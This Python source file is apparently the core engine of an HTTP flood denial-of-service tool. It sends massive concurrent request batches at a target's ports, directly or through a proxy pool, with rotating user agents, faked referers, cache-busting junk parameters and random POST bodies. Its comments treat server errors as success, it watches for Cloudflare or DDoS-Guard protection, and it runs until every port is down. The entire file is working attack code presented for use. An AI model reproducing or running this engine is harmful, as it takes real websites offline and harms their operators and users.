import asyncio
import random
import string
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse

import aiohttp
from aiohttp_socks import ProxyConnector

from models import AttackMethod, AttackStats, AttackStatus, PortStats, PortStatus
from proxy_pool import proxy_pool
from config import settings


UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
]

REF = [
    "https://www.google.com/search?q=", "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=", "https://yandex.ru/search/?text=",
    "https://www.reddit.com/", "https://github.com/",
]

_chars = string.ascii_letters + string.digits


def _junk(lo=3, hi=12):
    return "".join(random.choices(_chars, k=random.randint(lo, hi)))


def _h():
    return {
        "User-Agent": random.choice(UA),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": random.choice(REF) + _junk(5, 15),
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
    }


def _p():
    return {_junk(5, 10): _junk(100, 500) for _ in range(random.randint(1, 3))}


def _m(m):
    return random.choice(["GET", "POST", "HEAD"]) if m == AttackMethod.MIX else m.value


def _url(target, port):
    parsed = urlparse(target)
    host = parsed.hostname or target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
    path = parsed.path or "/"
    if port == 443:
        return f"https://{host}{path}"
    elif port == 80:
        return f"http://{host}{path}"
    return f"https://{host}:{port}{path}"


def _bust(base):
    sep = "&" if "?" in base else "?"
    return f"{base}{sep}{_junk(3,6)}={_junk(8,16)}"


class AttackEngine:
    def __init__(self):
        self.stats = AttackStats()
        self._stop = asyncio.Event()
        self._task: Optional[asyncio.Task] = None
        self.last_error: str = ""

    @property
    def is_running(self):
        return self._task is not None and not self._task.done()

    async def start(self, target, ports, method, threads, duration, use_proxies):
        if self.is_running:
            await self.stop()
        self._stop.clear()
        self.last_error = ""

        self.stats = AttackStats(
            target=target, method=method.value, status=AttackStatus.RUNNING,
            ports={p: PortStats(port=p, status=PortStatus.ALIVE) for p in ports},
            threads=threads, started_at=time.time(),
            proxies_loaded=proxy_pool.count if use_proxies else 0,
        )
        self._task = asyncio.create_task(self._run(target, ports, method, threads, duration, use_proxies))

    async def stop(self):
        if not self.is_running:
            return
        self.stats.status = AttackStatus.STOPPING
        self._stop.set()
        if self._task:
            try:
                await asyncio.wait_for(self._task, timeout=5.0)
            except (asyncio.TimeoutError, asyncio.CancelledError):
                self._task.cancel()
        self.stats.status = AttackStatus.FINISHED

    async def _run(self, target, ports, method, threads, duration, use_proxies):
        deadline = time.time() + duration if duration > 0 else 0
        tpp = max(threads // len(ports), 50)

        tasks = [asyncio.create_task(self._port_worker(target, p, method, tpp, deadline, use_proxies)) for p in ports]
        tasks.append(asyncio.create_task(self._health_loop(target)))

        await asyncio.gather(*tasks, return_exceptions=True)

        if self.stats.status == AttackStatus.RUNNING:
            if all(ps.status != PortStatus.ALIVE for ps in self.stats.ports.values()):
                self.stats.status = AttackStatus.ALL_DOWN
            else:
                self.stats.status = AttackStatus.FINISHED
        self.stats = self.stats.snapshot()

    async def _port_worker(self, target, port, method, threads, deadline, use_proxies):
        base = _url(target, port)
        sem = asyncio.Semaphore(threads)
        direct_timeout = aiohttp.ClientTimeout(total=settings.request_timeout, connect=3)
        proxy_timeout = aiohttp.ClientTimeout(total=settings.proxy_timeout, connect=2)

        direct_conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
        direct_session = aiohttp.ClientSession(connector=direct_conn, timeout=direct_timeout)

        try:
            while not self._stop.is_set():
                if deadline and time.time() >= deadline:
                    break
                ps = self.stats.ports.get(port)
                if not ps or ps.status != PortStatus.ALIVE:
                    await asyncio.sleep(0.5)
                    continue

                batch = []
                for _ in range(threads):
                    if use_proxies and proxy_pool.count > 0 and random.random() > 0.3:
                        batch.append(self._fire_proxy(base, port, method, sem, proxy_timeout))
                    else:
                        batch.append(self._fire_direct(direct_session, base, port, method, sem))
                await asyncio.gather(*batch, return_exceptions=True)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            self.last_error = f"Port {port}: {e}"
        finally:
            await direct_session.close()

    async def _fire_direct(self, session, base, port, method, sem):
        async with sem:
            if self._stop.is_set():
                return
            ps = self.stats.ports.get(port)
            if not ps or ps.status != PortStatus.ALIVE:
                return

            url = _bust(base)
            m = _m(method)
            kw = {"method": m, "url": url, "headers": _h(), "ssl": False}
            if m == "POST":
                kw["json"] = _p()

            try:
                async with session.request(**kw) as resp:
                    self._hit(ps, resp.status, resp.headers, True)
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
                self._miss(ps, True)
            except Exception:
                self._miss(ps, False)

    async def _fire_proxy(self, base, port, method, sem, timeout):
        async with sem:
            if self._stop.is_set():
                return
            ps = self.stats.ports.get(port)
            if not ps or ps.status != PortStatus.ALIVE:
                return

            px = proxy_pool.random()
            if not px:
                return

            url = _bust(base)
            m = _m(method)
            kw = {"method": m, "url": url, "headers": _h(), "ssl": False}
            if m == "POST":
                kw["json"] = _p()

            try:
                conn = ProxyConnector.from_url(px, ssl=False)
                async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
                    async with s.request(**kw) as resp:
                        self._hit(ps, resp.status, resp.headers, False)
            except Exception:
                self._miss(ps, False)

    def _hit(self, ps, status, headers, is_direct):
        ps.total_requests += 1
        ps.status_codes[status] = ps.status_codes.get(status, 0) + 1
        ps.last_response_time = time.time()
        self.stats.total_requests += 1

        # Любой HTTP ответ = сервер обработал запрос = нагрузка на него
        if status == 429:
            ps.successful += 1
            self.stats.successful += 1
        elif status >= 500:
            # Сервер корёжит — это успех
            ps.successful += 1
            self.stats.successful += 1
            if is_direct:
                ps.consecutive_fails = 0
        elif status in (301, 302, 303, 307, 308, 200, 201, 204, 400, 401, 403, 404, 405, 408):
            # Сервер ответил — значит он обрабатывает, значит нагрузка идёт
            ps.successful += 1
            self.stats.successful += 1
            if is_direct:
                ps.consecutive_fails = 0
        else:
            ps.successful += 1
            self.stats.successful += 1
            if is_direct:
                ps.consecutive_fails = 0

        srv = (headers.get("server") or "").lower()
        if "cloudflare" in srv or "ddos-guard" in srv:
            ps.status = PortStatus.PROTECTED

    def _miss(self, ps, is_direct):
        ps.total_requests += 1
        ps.failed += 1
        self.stats.total_requests += 1
        self.stats.failed += 1
        if is_direct:
            ps.consecutive_fails += 1

    async def _health_loop(self, target):
        await asyncio.sleep(10)
        timeout = aiohttp.ClientTimeout(total=4, connect=3)

        while not self._stop.is_set():
            for port, ps in list(self.stats.ports.items()):
                if ps.status != PortStatus.ALIVE:
                    continue
                url = _url(target, port)
                alive = False
                try:
                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), timeout=timeout) as s:
                        async with s.get(url, headers=_h(), ssl=False) as r:
                            alive = True
                except Exception:
                    pass
                if not alive and ps.consecutive_fails >= 30:
                    ps.status = PortStatus.DOWN

            if all(ps.status != PortStatus.ALIVE for ps in self.stats.ports.values()):
                self._stop.set()
                self.stats.status = AttackStatus.ALL_DOWN
                break
            await asyncio.sleep(10)


engine = AttackEngine()
